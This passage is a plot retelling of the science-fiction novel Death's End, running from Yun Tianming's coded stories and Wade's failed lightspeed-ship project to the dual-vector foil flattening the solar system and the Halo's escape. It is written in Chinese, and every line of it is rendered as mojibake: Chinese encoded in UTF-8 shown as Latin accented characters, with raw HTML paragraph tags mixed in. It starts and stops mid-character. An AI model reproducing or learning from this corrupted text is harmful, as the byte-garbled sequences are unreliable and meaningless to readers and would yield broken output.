¥ç›‘è§†ç€è¿™åœºè°ˆè¯ï¼Œäº‘å¤©æ˜åœ¨è·Ÿç¨‹å¿ƒèŠäº†å¾ˆå¤šå®¶å¸¸è¯åï¼Œä¾¿ç»™ä»–è®²äº†ä¸‰ä¸ªä»–åœ¨é£èˆ¹ä¸Šç»å¸¸ç»™ä¸‰ä½“äººè®²çš„æ•…äº‹ã€‚è°ˆè¯ä¾¿ç»“æŸäº†ã€‚åœ¨æœ€åçš„ä¸€åˆ†é’Ÿï¼Œç¨‹å¿ƒå¯¹äº‘å¤©æ˜æå‡ºäº†çº¦ä¼šé‚€è¯·ï¼Œå¥¹è¯´ï¼Œå®‡å®™å¾ˆå¤§ï¼Œç”Ÿæ´»æ›´å¤§ï¼Œæˆ‘ä»¬è¿˜ä¼šç›¸è§çš„ã€‚å¦‚æœæœ‰æœºä¼šï¼Œå°±åœ¨ä½ é€ç»™æˆ‘çš„é‚£é¢—æ˜Ÿæ˜Ÿä¸Šè§é¢å§ã€‚äº‘å¤©æ˜åœ¨æœ€åä¸€åˆ»å›ç­”åˆ°ï¼Œå¥½ï¼Œåœ¨æˆ‘ä»¬çš„æ˜Ÿæ˜Ÿã€‚</p><p>&emsp;&emsp;é€šè®¯ç»“æŸã€‚å½“ç¨‹å¿ƒè¿”èˆªåï¼Œè¢«ç«‹é©¬å¸¦è¿›äº†ä¸€ä¸ªå°æˆ¿é—´ï¼Œè¿™ä¸ªæˆ¿é—´æ˜¯æ™ºå­ç›²åŒºã€‚è™½ç„¶ä¸‰ä½“äººå·²ç»æ˜ç¡®è¡¨ç¤ºï¼Œæ™ºå­ä¼šå…¨éƒ¨æ’¤ç¦»åœ°çƒï¼Œå•ä½äº†ä¿é™©èµ·è§ï¼Œä¸ºäº†äº‘å¤©æ˜çš„å®‰å…¨ï¼Œéœ€è¦åœ¨è¿™é‡Œè®°å½•ä¸‹è°ˆè¯çš„å†…å®¹ã€‚ç¨‹å¿ƒåœ¨è¿”ç¨‹ä¸­ï¼Œå¿ƒç†ä¸æ–­èƒŒç€äº‘å¤©æ˜ç»™å¥¹å°†çš„ä¸‰ä¸ªæ•…äº‹ï¼Œå› ä¸ºå¥¹çŸ¥é“ï¼Œè¿™ä¸‰ä¸ªæ•…äº‹å°±æ˜¯æ‹¯æ•‘åœ°çƒçš„å…³é”®ï¼Œé€šè¿‡é•¿æ—¶é—´çš„è§£è¯»ï¼Œäººä»¬ç»ˆäºå‘ç°äº†éšè—åœ¨è¿™ä¸‰ä¸ªæ•…äº‹ä¸­çš„ç§˜å¯†ã€‚</p><p>&emsp;&emsp;1ã€å…‰é€Ÿé£èˆ¹çš„æ³•å‘å±•æ–¹å‘åº”ä½¿ç”¨ç©ºé—´æ›²ç‡é©±åŠ¨å™¨ï¼Œè¿™ç§é©±åŠ¨å™¨æ˜¯é€šè¿‡å½±å“ç©ºé—´ï¼Œåˆ©ç”¨ç©ºé—´çš„æ›²ç‡æŠŠé£èˆ¹æ‹‰è‡³å…‰é€Ÿã€‚æ‰“ä¸ªæ¯”æ–¹ï¼Œå°±åƒåœ¨å°çº¸èˆ¹çš„èˆ¹å°¾ï¼Œè£…ä¸€å—å°é¦™çš‚ï¼Œèˆ¹ä¼šè‡ªåŠ¨å‘å‰ã€‚è¿™æ˜¯å› ä¸ºè‚¥çš‚æ”¹å˜äº†æ°´çš„å¼ åŠ›ï¼Œä½†èˆ¹å‰æ–¹æ°´é¢çš„å¼ åŠ›ä¸å˜ï¼Œä»è€ŒæŠŠèˆ¹æ‹‰äº†è¿‡å»ã€‚2ã€ç”¨ä¸€å±‚ä½å…‰é€Ÿå¸¦åŒ…è£¹ä½å¤ªé˜³ç³»ï¼Œè¿™å°±æ˜¯å…¨å®‡å®™é€šç”¨çš„å®‰å…¨ç”Ÿå£°æ˜ã€‚è¿™ä¸ªè¢«åŒ…è£¹çš„åŒºåŸŸè¢«ç§°ä¹‹ä¸ºé»‘åŸŸï¼Œåœ¨è¿™ä¸ªé»‘åŸŸé‡Œï¼Œæ²¡æœ‰é£èˆ¹å¯ä»¥é£å‡ºå»ï¼Œé»‘åŸŸæ˜¯ä¸€ä¸ªå®Œå…¨å°é—­çš„ç©ºé—´ï¼Œåœ¨è¿™é‡Œï¼Œäººä»¬å¯ä»¥è·å¾—å®‰å…¨ï¼Œä½†ä¼šå¤±å»è‡ªç”±ã€‚3ã€‚æœ€åä¸€ä¸ªç§˜å¯†æš‚ä¸”ä¸è¡¨ï¼Œå› ä¸ºç›´åˆ°æœ€åï¼Œæœ‰äººæ‰å‘ç°äº†å®ƒã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººå½»åº•ç¦»å¼€è€Œæ¥å¤ªé˜³ç³»ã€‚ä¸ä¹…åäººä»¬ä¸ºäº†é¿å…è¢«å…‰ç²’æ‰“å‡»çš„ç¾éš¾ï¼Œå¼€å§‹äº†ï¼Œæ©ä½“å·¥ç¨‹ã€‚ä»€ä¹ˆæ˜¯æ©ä½“å·¥ç¨‹å‘¢ï¼Ÿä»¥æœ¨æ˜Ÿã€åœŸæ˜Ÿã€å¤©ç‹æ˜Ÿå’Œæµ·ç‹æ˜Ÿå››å¤§å·¨æ˜Ÿä¸ºæ©ä½“ï¼Œåœ¨ä»–ä»¬çš„èƒŒé˜³é¢å»ºé€ å¤ªç©ºåŸã€‚ä¸ºä»€ä¹ˆäººä»¬ä¸é€ å…‰é€Ÿé£èˆ¹å‡†å¤‡è·‘è·¯å‘¢ï¼Ÿä¸€æ–¹é¢å…‰é€Ÿé£èˆ¹ä¼šåœ¨å¤ªç©ºä¸­ç•™ä¸‹å°è®°ï¼Œå¾ˆå®¹æ˜“è¢«é«˜çº§æ–‡æ˜è§‚æµ‹åˆ°ï¼›å¦ä¸€æ–¹é¢ï¼Œåœ¨è¿™ä¸ªæ—¶ä»£äººæƒæ„è¯†æå¼ºï¼Œå› ä¸ºåªæœ‰å°‘éƒ¨åˆ†äººèƒ½ç¦»å¼€ï¼Œå¤§éƒ¨åˆ†äººè¦ç•™ä¸‹ï¼Œæ‰€ä»¥åˆ¶é€ å…‰é€Ÿé£èˆ¹æˆä¸ºäº†ä¸¥é‡çš„è¿æ³•è¡Œä¸ºã€‚ä½†ç¨‹å¿ƒå’ŒAAçŸ¥é“ï¼Œå»ºé€ å…‰é€Ÿé£èˆ¹æ‰æ˜¯äººç±»çš„å‡ºè·¯ã€‚</p><p>&emsp;&emsp;æœ‰ä¸€å¤©ï¼Œç»´å¾·æ‰¾åˆ°äº†ç¨‹å¿ƒï¼Œå¯¹å¥¹è¯´ï¼Œé€ å…‰é€Ÿé£èˆ¹æ˜¯ä¸€æ¡æ­£ç¡®çš„è·¯ã€‚ä½†ä½ æ²¡æœ‰åŠ›é‡é€ å‡ºæ¥ï¼ŒæŠŠä½ æ‹¥æœ‰çš„ä¸€åˆ‡èµ„æºç»™æˆ‘ï¼Œè®©æˆ‘æ¥ï¼Œç»´å¾·éšåçš„ä¸€å¥è¯è®©ç¨‹å¿ƒåŒæ„äº†ã€‚ä»–å†·é™çš„å¯¹ç¨‹å¿ƒè¯´ï¼Œä¸è¦çŠ¯ç¬¬äºŒæ¬¡é”™ï¼Œæ€ç´¢è‰¯ä¹…åï¼Œç¨‹å¿ƒç­”åº”äº†ç»´å¾·ã€‚ä½†å¥¹æœ‰ä¸ªæ¡ä»¶ï¼Œå¥¹è¯´ï¼Œå½“ä½ åšçš„äº‹å±å®³äººç±»çš„ç”Ÿå‘½æ—¶ï¼Œæˆ‘å¯ä»¥æ”¶å›ä½ çš„æƒåˆ©ã€‚ç»´å¾·ç­”åº”äº†ã€‚ç¨‹å¿ƒå’ŒAAè¿›å…¥äº†å†¬çœ ï¼Œç­‰å¾…æˆæœã€‚æ¥ä¸‹æ¥ï¼Œç¨‹å¿ƒå¾—å…¬å¸å…¨æƒç”±ç»´å¾·è´Ÿè´£ã€‚</p><p>&emsp;&emsp;æ©ä½“çºªå…ƒåä¸€å¹´ï¼Œæ²‰ç¡äº†62å¹´çš„ç¨‹å¿ƒè¢«å”¤é†’ï¼Œç”±äºå¤šæ¬¡å†¬çœ ï¼Œç¨‹å¿ƒç°åœ¨çš„å®é™…å¹´é¾„æ˜¯33å²ï¼Œåœ¨è¿™ä¸ªå¹³å‡å¯¿å‘½150å²çš„å¹´ä»£é‡Œï¼Œå¥¹è¿˜æ˜¯ä¸ªå°‘å¥³ã€‚åœ¨è¿™ä¸ªçºªå…ƒï¼Œå½¢æˆäº†å››ä¸ªå¤ªç©ºåŸç¾¤è½ï¼Œåˆ†åˆ«åˆ†å¸ƒåœ¨æœ¨æ˜Ÿã€åœŸæ˜Ÿã€å¤©ç‹æ˜Ÿã€æµ·ç‹æ˜Ÿçš„èƒŒé˜³é¢ï¼Œåœ°çƒæˆä¸ºäº†å¤ªé˜³ç³»è”é‚¦ä¸­çš„ä¸€ä¸ªæ™®é€šåŸé‚¦ã€‚ç°åœ¨åœ°çƒä¸Šï¼ŒäººçƒŸç¨€å°‘ï¼Œåªæœ‰äº”ç™¾ä¸‡ä¸æ€•æ­»çš„äººç”Ÿæ´»åœ¨é‚£é‡Œï¼Œæ¯ä¸ªäººåœ¨é‚£ç”Ÿæ´»å¾—åƒå›½ç‹ä¸€æ ·ï¼Œå¤§è‡ªç„¶é‡æ–°å é¢†äº†åœ°çƒã€‚å¾ˆå¤šäººä¸æ„¿æ„ç•™åœ¨åœ°çƒæ˜¯å› ä¸ºï¼Œå¦‚æœå¤ªé˜³ç³»é­å—å…‰ç²’æ‰“å‡»ï¼Œé‚£ä¹ˆåœ°çƒä¸Šçš„äººå°†æ— ä¸€å¹¸å…ã€‚ç¨‹å¿ƒè¢«å¸¦åˆ°äº†ä¸€åº§å«æ˜Ÿç¯åŸçš„å¤ªç©ºåŸï¼Œä»–åœ¨è¿™è§åˆ°äº†ä¸€ç™¾å¤šå²çš„ç»´å¾·ã€‚ç»´å¾·ä¸€ç›´åœ¨ç ”å‘å…‰é€Ÿé£èˆ¹ï¼Œç°åœ¨å·²ç»å°æœ‰æˆæœã€‚ä½†å°±åœ¨å…³é”®æ—¶åˆ»ï¼Œç”±äºè”é‚¦æ”¿åºœçš„åå¤é˜»æŒ ï¼Œç»´å¾·ä¸ä»–ä»¬æ’•ç ´äº†è„¸ï¼Œç»´å¾·ç°åœ¨è¢«æ”¿åºœå†›åŒ…å›´ã€‚ä½†ä»¥ç»´å¾·ç°åœ¨çš„å®åŠ›ï¼Œä»–å¯ä»¥æ‹¼æ­»ä¸€æï¼Œæ–—ä¸ªé±¼æ­»ç½‘ç ´ã€‚ä½†ä»–å¯¹ç¨‹å¿ƒæœ‰æ‰¿è¯ºï¼Œæ”¿åºœå”¤é†’ç¨‹å¿ƒå¾—åŸå› ï¼Œå°±æ˜¯å¸Œæœ›å¥¹å¯ä»¥æƒç»´å¾·æ”¾ä¸‹æ­¦å™¨ã€‚ç»è¿‡ç»´å¾·å…­åå¹´çš„åŠªåŠ›ï¼Œæ›²ç‡é©±åŠ¨å™¨å·²ç»ç ”åˆ¶çš„å·®ä¸å¤šäº†ï¼Œæ˜¯å¦èƒ½å¤Ÿç»§ç»­ï¼Œå°±çœ‹ç¨‹å¿ƒä¸€å¥è¯ã€‚ç¨‹å¿ƒç°åœ¨æƒ³ï¼Œå¦‚æœæˆ˜æ–—å¼€å§‹ï¼Œæˆåƒä¸Šä¸‡äººä¼šæ­»äºéå‘½ï¼Œå–„è‰¯çš„ç¨‹å¿ƒå¯¹ç»´å¾·è¯´å—ï¼Œä½ çš„è¯ºè¨€è¿˜æœ‰æ•ˆå—ï¼Ÿç»´å¾·ç‚¹äº†ç‚¹å¤´ï¼Œç¨‹å¿ƒè¯´é“ï¼Œå¥½ï¼Œç«‹åˆ»åœæ­¢ä¸€åˆ‡ã€‚ç»´å¾·è¿‘ä¹æ³è¯·çš„è¯´åˆ°ï¼Œå†è€ƒè™‘ä¸€ä¸‹å§ï¼Œç¨‹å¿ƒåšå®šçš„è¯´ï¼Œä¸éœ€è¦è€ƒè™‘ã€‚ç»´å¾·æ— åŠ©çš„è¯´åˆ°ï¼Œå¤±å»äººæ€§ï¼Œå¤±å»å¾ˆå¤šï¼›å¤±å»å…½æ€§ï¼Œå¤±å»ä¸€åˆ‡ã€‚ç¨‹å¿ƒæœæ–­çš„å›ç­”é“ï¼Œæˆ‘é€‰æ‹©äººæ€§ã€‚</p><p>&emsp;&emsp;ç°åœºå¯‚é™äº†ï¼Œç»´å¾·è®©ä¼—äººæ”¾ä¸‹æ­¦å™¨ï¼Œå‡†å¤‡æŠ•é™ã€‚ç»´å¾·å¿ƒä¸­å‹‡å¾€ç›´å‰çš„ç«ç„°ç†„ç­äº†ã€‚ä»–å¾®ç¬‘çš„å¯¹ç¨‹å¿ƒè¯´ï¼Œå°å¥³å­©ï¼Œä½ çœ‹æˆ‘éµå®ˆäº†è¯ºè¨€ã€‚ä¸ä¹…åï¼Œè¢«æ•çš„ç»´å¾·è¢«å¤„ä»¥æ­»åˆ‘ã€‚ç¨‹å¿ƒæƒ³åˆ°æœªæ¥ï¼Œå»çœ‹å¤ªé˜³ç³»è¢«æ‰“å‡»åçš„ä¸–ç•Œã€‚ä¾¿å†æ¬¡è¿›å…¥äº†å†¬çœ ã€‚</p><p>&emsp;&emsp;æ©ä½“çºªå…ƒå…­åä¸ƒå¹´ã€‚æ­¤æ—¶ä¸€è‰˜å¤ªç©ºé£èˆ¹å‘ç°äº†å¤ªé˜³ç³»ã€‚è¿™è‰˜é£èˆ¹ä¸»è¦çš„ä»»åŠ¡ï¼Œå°±æ˜¯è—å¥½è‡ªå·±å¹¶æ¸…ç†ä»–ä»¬å‘ç°çš„ä½çº§æ–‡æ˜ã€‚å…¶ä¸­ï¼Œæœ‰ä¸€ä¸ªè¢«ç§°ä¸ºæ­Œè€…çš„åº•å±‚å·¥ä½œäººå‘˜ï¼Œå‘é¢†å¯¼ç”³è¯·äº†ä¸€ç‰‡å«äºŒå‘ç®”çš„æ­¦å™¨ï¼Œæ¼«ä¸ç»å¿ƒçš„å°†å®ƒä»å¿˜äº†å¤ªé˜³ç³»ã€‚</p><p>&emsp;&emsp;åœ¨å¤ªç©ºåŸå†…ï¼Œç¨‹å¿ƒå’ŒAAéƒ½è¢«å”¤é†’äº†ã€‚é»‘æš—æ£®æ—æ‰“å‡»ç»ˆäºé™ä¸´äº†ï¼Œæ²¡æœ‰äººå‘æ©ä½“é€ƒè·‘ï¼Œå› ä¸ºå¤ªé˜³ç³»å¹¶æ²¡æœ‰é­åˆ°å…‰ç²’æ‰“å‡»ï¼Œè€Œæ˜¯å—åˆ°äº†ä¸€ç‰‡å°çº¸æ¡ã€‚äººä»¬é€šè¿‡å¼•åŠ›æ³¢æ‰¾åˆ°äº†è¿™å¼ æ²¡æœ‰åšåº¦ï¼Œåªæœ‰ä¸€å¼ ä¿¡ç”¨å¡ä»£é”€çš„ç™½è‰²çº¸æ¡ã€‚è¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œè¿™å¼ å°çº¸æ¡çªç„¶è¶Šæ¥è¶Šå¤§ï¼Œæ‰€æœ‰æ¥è§¦ä»–çš„ç‰©ä½“ï¼Œéƒ½é­åˆ°äº†é™ç»´æ‰“å‡»ã€‚ä»ä¸‰ç»´é™åˆ°äºŒç»´ï¼Œæˆäº†ä¸€å¼ ç”»ã€‚åœ¨ä¿„äºŒå‘ç®”å‘¨å›´çš„é£èˆ¹å‡†å¤‡é€ƒç¦»ï¼Œä½†ä»–ä»¬å‘ç°ï¼Œåªæœ‰å…‰é€Ÿæ‰èƒ½é€ƒç¦»äºŒå‘ç®”çš„å¼•åŠ›ã€‚ä»¥è¿™å¼ çº¸æ¡å˜å¤§çš„é€Ÿåº¦ï¼Œå…«åˆ°åå¤©åï¼Œæ•´ä¸ªå¤ªé˜³ç³»éƒ½å°†å˜æˆä¸€å¼ æ²¡æœ‰åšåº¦çš„ç”»ã€‚è¿™å°±æ˜¯äº‘å¤©æ˜åœ¨æ•…äº‹é‡Œï¼Œæœ€åéšè—çš„ç§˜å¯†ã€‚é™ç»´æ‰“å‡»ã€‚</p><p>&emsp;&emsp;äººç±»å¤šå¹´æ¥ï¼Œæ®šç²¾ç«­è™‘çš„åœ¨å¤ªé˜³ç³»å¸ƒç½®æ©ä½“åŸå¸‚ï¼Œä½†äººç±»çŸ¥é“æ©ä½“ï¼Œéš¾é“é‚£äº›æ‹¥æœ‰æ›´é«˜çº§æ˜æ–‡çš„å¤–æ˜Ÿäººå°±ä¸çŸ¥é“å—ï¼Ÿå¼±å°å’Œæ— çŸ¥ä¸æ˜¯ç”Ÿå­˜çš„éšœç¢ï¼Œå‚²æ…¢æ‰æ˜¯ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒå’ŒAAåœ¨å†¥ç‹æ˜Ÿä¸Šçš„å¤ªç©ºåšç‰©é¦†é‡Œï¼Œæ‰¾åˆ°äº†å¿«ä¸¤ç™¾å²çš„ç½—è¾‘ï¼Œä¸‰äººå¯’æš„äº†ä¸€é˜µåï¼Œå¼€å§‹å°†ä¸€äº›åç”»è¿åˆ°äº†é£èˆ¹ä¸Šã€‚ä»–ä»¬ä¸å¸Œæœ›è¿™ä¸€äº›ç”»åŒåšç‰©é¦†ä¸€åŒäºŒç»´åŒ–ã€‚å› ä¸ºé‚£æ ·ï¼Œæœªæ¥åˆ°è®¿çš„å¤–æ˜Ÿäººå¯èƒ½å°±è§£è¯»ä¸äº†äººç±»æ›¾ç»çš„æ–‡åŒ–ç‘°å®äº†ã€‚ç½—è¾‘è‡ªå·±ç•™ä¸‹äº†ä¸€å¹…ç”»ï¼Œè¿™å¹…ç”»å°±æ˜¯è’™å¨œä¸½èï¼Œä»–å¹´è½»æ—¶æ›¾åœ¨è¿™å¹…ç”»é¢å‰ï¼Œä¸ä¸€äººé™·å…¥çˆ±æ²³ã€‚</p><p>&emsp;&emsp;ç½—è¾‘å‚¬ä¿ƒä»–ä»¬å°½å¿«ä¸Šé£èˆ¹æŠŠç”»è¿åˆ°å¤–é¢ï¼Œä»–è‡ªå·±å†³å®šç•™åœ¨è¿™ä¸ªåšç‰©é¦†é‡Œï¼Œå’Œè’™å¨œä¸½èä¸€èµ·çœ‹ç€å¤ªé˜³ç³»è¢«äºŒç»´åŒ–ã€‚å…¶å®ï¼Œç¨‹å¿ƒä»–ä»¬ä¹˜åçš„è¿™è‰˜é£èˆ¹å¤§æœ‰æ¥å†ï¼Œè¿™è‰˜é£èˆ¹åå«æ˜Ÿç¯å·ï¼Œä¸ä»…ä½¿ç”¨äº†äº›è·Ÿæ°´æ»´ä¸€æ ·åšå›ºçš„ææ–™ï¼Œè¿˜è£…å¤‡äº†å®Œæ•´çš„ç”Ÿæ€ç³»ç»Ÿå’Œå¸¸è§„å¼•æ“ï¼Œæ­¤å¤–ï¼Œè¿˜æ‹¥æœ‰æ›²ç‡é©±åŠ¨å¼•æ“å¯è¿›è¡Œå…‰é€Ÿèˆªè¡Œã€‚è¿™è‰˜é£èˆ¹ï¼Œæ˜¯å¤ªé˜³ç³»å”¯ä¸€ä¸€è‰˜å…‰é€Ÿé£èˆ¹ã€‚è¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ</p><p>&emsp;&emsp;ç½—è¾‘é€šè¿‡è¿œç¨‹è§†é¢‘é€šè®¯ï¼Œå‘Šè¯‰äº†ä¸€ç›´è’™åœ¨é¼“é‡Œç¨‹å¿ƒå’ŒAAã€‚åŸæ¥ï¼Œç»´å¾·æ­»åï¼Œæ®‹ä½™çš„åŠ›é‡å¹¶æ²¡æœ‰æ”¾å¼ƒã€‚æ›¾ç»é¢å£è€…é›·è¿ªäºšå…¹åœ¨æ°´æ˜Ÿä¸Šåšçˆ†ç‚¸è¯•éªŒï¼ŒæŠŠæ°´æ˜Ÿç‚¸äº†ä¸ªå¤§å‘ã€‚ä¸ºäº†éšè”½ï¼Œç»´å¾·çš„ä½™å…šå°±æŠŠåŸºåœ°è®¾ç«‹åœ¨äº†è¿™é‡Œï¼Œä»–ä»¬å¯¹å¤–è¡¨ç¤ºåœ¨ç ”ç©¶å¤ªé˜³æ´»åŠ¨ã€‚åæ¥è”é‚¦æ”¿åºœä»‹å…¥ï¼Œå¹¶ä¸€èµ·æ‚„æ‚„åœ°ç ”ç©¶å…‰é€Ÿé£èˆ¹ã€‚æ˜Ÿç¯ä¸Šå®‰è£…çš„å¼•æ“å°±æ˜¯ç¬¬ä¸€ä»£è¯•éªŒå“ã€‚åªæœ‰å°‘æ•°å¹´è¿ˆçš„å…ƒè€çŸ¥é“è¿™ä»¶äº‹ï¼Œå…¶ä¸­ï¼Œå°±åŒ…æ‹¬ç½—è¾‘ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒæƒ³å›å»æ¥ç½—è¾‘ï¼Œä½†é£èˆ¹ä¸å¬ç¨‹å¿ƒçš„ã€‚å› ä¸ºç½—è¾‘ï¼Œæ‹¥æœ‰è¿™è‰˜é£èˆ¹çš„æœ€é«˜æŒ‡æŒ¥æƒã€‚ç½—è¾‘ç¬‘äº†ç¬‘è¯´ï¼Œæˆ‘è¿™æ ·å²æ•°çš„äººä¸é€‚åˆè¿œèˆªï¼Œå­©å­ä»¬ä¸è¦ä¸ºæˆ‘æ“å¿ƒäº†ï¼Œæˆ‘ä»€ä¹ˆéƒ½æ²¡æœ‰å¤±å»ã€‚ç½—è¾‘å‘½ä»¤æ˜Ÿç¯å·è¿›å…¥å…‰é€Ÿèˆªè¡Œåˆ°å¤ªé˜³ç³»ä»¥å¤–ã€‚é£èˆ¹å¼€å§‹å¯åŠ¨ï¼Œèˆ¹åçš„ç©ºé—´å¼€å§‹ç•¸å˜ã€‚</p><p>&emsp;&emsp;å¾ˆå¤šäººä¹˜åç€å¸¸è§„æ¨åŠ¨å™¨çš„é£èˆ¹ï¼Œæƒ³é€ƒå‡ºå¤ªé˜³ç³»ã€‚ä½†é‚£æ˜¯ä¸å¯èƒ½çš„ã€‚ä½†ä»–ä»¬çœ‹åˆ°æ˜Ÿç¯å·åé¢çš„ç©ºé—´æ­£åœ¨ç•¸å˜æ—¶ï¼Œè¿™äº›äººå‘ç°ï¼Œè¿™æ˜¯ä¸€è‰˜æ­£åœ¨åŠ é€Ÿçš„å…‰é€Ÿé£èˆ¹ã€‚äºæ˜¯ï¼Œè¿™äº›è¿‘ä¹ç–¯ç‹‚çš„äººï¼Œæœ‰çš„è¦å»æ‹¦æˆªï¼Œæœ‰çš„è¦å»å‡»æ¯ï¼Œæœ‰çš„è¦å»åŠ«æŒã€‚ä½†æ˜Ÿç¯å·éå¸¸çš„åšå›ºï¼Œè¿™äº›äººæƒ³æŠŠé£èˆ¹åˆ®ç ´ä¸€ç‚¹çš®å„¿éƒ½éš¾ã€‚å¦‚æœå½“åˆç¨‹å¿ƒæ²¡æœ‰ç»„ç»‡ç»´å¾·ï¼Œè€½è¯¯äº†é‚£å®è´µçš„æ—¶é—´ï¼Œå…‰é€Ÿé£èˆ¹æ˜¯ä¸ªå¯ä»¥æ‰¹é‡ç”Ÿäº§çš„ã€‚ä½†ç°åœ¨ï¼Œä¸€åˆ‡éƒ½æ™šäº†ã€‚ç¨‹å¿ƒä»é€»è¾‘çš„çœ¼ç¥ä¸­è¯»å‡ºäº†ä¸€å¥è¯ï¼Œå­©å­ï¼Œçœ‹çœ‹ä½ éƒ½å¹²äº†äº›ä»€ä¹ˆå‘€ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒç°åœ¨æ˜ç™½äº†ï¼Œä»€ä¹ˆæ©ä½“ï¼Œä»€ä¹ˆå®‰å…¨å£°æ˜ï¼Œåªæœ‰å…‰é€Ÿé£èˆ¹æ‰æ˜¯æ´»è·¯ã€‚äº‘å¤©æ˜æŒ‡å‡ºäº†è¿™æ¡è·¯ï¼Œè€Œç¨‹å¿ƒå´æŠŠå®ƒå µæ­»äº†ã€‚ç¨‹å¿ƒåˆ°å¤´æ¥ï¼Œè¿˜æ˜¯çŠ¯äº†ç¬¬äºŒæ¬¡é”™è¯¯ã€‚ç¨‹å¿ƒå¼€å§‹æ¨ç»´å¾·ï¼Œä¸ºä»€ä¹ˆè¦å±¥è¡Œæ‰¿è¯ºã€‚åœ¨é€šè¯çš„æœ€åä¸€åˆ»ï¼Œç½—è¾‘è¯´ï¼Œæˆ‘è¦è¿›ç”»é‡Œäº†ï¼Œå­©å­ä»¬èµ°å¥½ã€‚</p><p>&emsp;&emsp;é£èˆ¹è¦è¿›å…¥å…‰é€Ÿäº†ï¼Œç¨‹å¿ƒçªç„¶æƒ³åˆ°è‡ªå·±è¿˜æœ‰ä¸ªçº¦ä¼šã€‚ç¨‹å¿ƒè¯´ï¼Œå»æˆ‘ä»¬çš„æ˜Ÿæ˜Ÿã€‚äºæ˜¯ï¼Œå¤ªé˜³ç³»ä»…å­˜çš„ä¸¤ä¸ªå¥³äººï¼Œç»™å¿˜äº†äº‘å¤©æ˜é€ç»™ç¨‹å¿ƒçš„æ˜Ÿæ˜Ÿã€‚ä¸€æ®µæ—¶é—´åï¼Œæ˜Ÿç¯å·åˆ°äº†è¿™é¢—æ’æ˜Ÿï¼Œå¹¶åœ¨ä¸€é¢—è“è‰²çš„è¡Œæ˜Ÿä¸Šé™è½äº†ã€‚åœ¨è¿™é¢—è“æ˜Ÿä¸Šæœ‰ä¸€ä¸ªå¸…æ°”çš„ç”·äººåœ¨è¿æ¥ä»–ä»¬ã€‚è¿™ä¸ªäººï¼Œåå«å…³ä¸€å¸†ã€‚æ˜¯ä¸‡æœ‰å¼•åŠ›å·ä¸Šçš„ç ”ç©¶å‘˜ï¼Œäº”å¹´å‰æ‰åœ¨å†¬çœ ä¸­è¢«å”¤é†’ã€‚ä»–æ”¶åˆ°äº†æ˜Ÿç¯å·çš„å¼•åŠ›æ³¢ä¿¡å·ï¼Œæ‰€ä»¥ç•™åœ¨è¿™ç­‰å¥¹ä»¬ã€‚ä»è¿™ä¸ªäººçš„å£ä¸­ï¼ŒäºŒäººå¾—çŸ¥ï¼Œåˆ°å¤´çš„ä¸‡æœ‰å¼•åŠ›å·å’Œè“è‰²ç©ºé—´å·ä¸Šçš„äººï¼ŒæˆåŠŸåˆ›å»ºäº†å››ä¸ªä¸–ç•Œï¼Œå¹¶ä¸”è¿˜åœ¨æ‰©å¼ ä¸­ã€‚è¿™é¢—è“æ˜Ÿä¸Šï¼Œæ²¡æœ‰é«˜ç­‰ç”Ÿå‘½ï¼Œåƒæ˜¯åŸå§‹çš„åœ°çƒã€‚ä»–ä»¬ä¸‰äººåœ¨è¿™å¾…äº†ä¸€æ®µæ—¶é—´ã€‚</p><p>&emsp;&emsp;æœ‰ä¸€å¤©ï¼Œå…³ä¸€å¸†å‘ç°ï¼Œä¸´è¿‘çš„å¦ä¸€é¢—ç°è‰²è¡Œæ˜Ÿä¸Šæœ‰é£èˆ¹çš„è¸ªè¿¹ã€‚å…³ä¸€å¸†è¦å»å‰å¾€æŸ¥çœ‹ï¼Œç¨‹å¿ƒè¦è·Ÿç€ï¼Œå› ä¸ºå¥¹æƒ³è¿™å¯èƒ½å’Œäº‘å¤©æ˜æœ‰å…³ã€‚AAç•™åœ¨è“æ˜Ÿç­‰ç€ä»–ä»¬å›æ¥ã€‚äºŒäººä¹˜åå…³ä¸€å¸†çš„äº¨åˆ©å·ï¼Œå‰å¾€ç°æ˜Ÿã€‚åœ¨é£èˆ¹ä¸Šï¼Œå…³ä¸€å¸†é«˜é€Ÿç¨‹å¿ƒï¼Œå®‡å®™ä¸­æœ€å¯æ€•çš„æ­¦å™¨å°±æ˜¯ï¼Œå®‡å®™è§„å¾‹ã€‚äºŒå‘ç®”å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚äºŒå‘ç®”åœ¨é«˜ç­‰æ–‡æ˜é‚£å¾ˆå¸¸ç”¨ï¼Œå®ƒä¸€æ—¦å±•å¼€å°±ä¼šæ— é™æ‰©å¼ ï¼Œæ‰€ä»¥ï¼Œæ€»æœ‰ä¸€å¤©ï¼Œæ•´ä¸ªå®‡å®™ä¹Ÿä¼šäºŒç»´åŒ–ã€‚å®‡å®™æ­£åœ¨æ­»å»ï¼Œä¸€äº›å¤§ç¥çº§æ–‡æ˜ï¼Œä»–ä»¬å·²ç»åœ¨ç ”ç©¶ï¼Œå¦‚ä½•å°†è‡ªå·±äºŒç»´åŒ–åï¼Œèƒ½ç»§ç»­æ´»åœ¨äºŒç»´ä¸–ç•Œé‡Œã€‚å¤§æ¦‚åœ¨ä¸€ç™¾å¤šäº¿å¹´å‰ï¼Œå®‡å®™èµ·ç æœ‰åç»´ã€‚ç»è¿‡ä¸æ–­åœ°æ˜Ÿé™…æˆ˜äº‰ï¼Œå®‡å®™æ‰å˜æˆå…ˆè¿›çš„ä¸‰ç»´ã€‚æœ‰ä¸€æ‰¹å¤§ç¥çº§æ–‡æ˜ï¼Œä»–ä»¬åœ¨åŠªåŠ›ä½¿å®‡å®™é‡å¯ã€‚</p><p>&emsp;&emsp;èˆªè¡Œäº†å‡ å¤©ï¼Œé£èˆ¹æŠµè¾¾äº†ç°æ˜Ÿï¼Œåœ¨é‚£é‡Œï¼Œä»–ä»¬æ²¡æœ‰æ‰¾åˆ°äº‘å¤©æ˜ï¼Œè€Œæ˜¯çœ‹è§äº†é«˜ç­‰å¤–æ˜Ÿæ–‡æ˜ç•™ä¸‹çš„æ­»çº¿ã€‚æ­»çº¿æå…¶çš„é»‘ï¼Œä»»ä½•ä¸œè¥¿è¿›å»ï¼Œéƒ½å‡ºä¸æ¥ï¼Œè¿å…‰ä¹Ÿä¸€æ ·ã€‚æ­»çº¿éšæ—¶ä¼šç 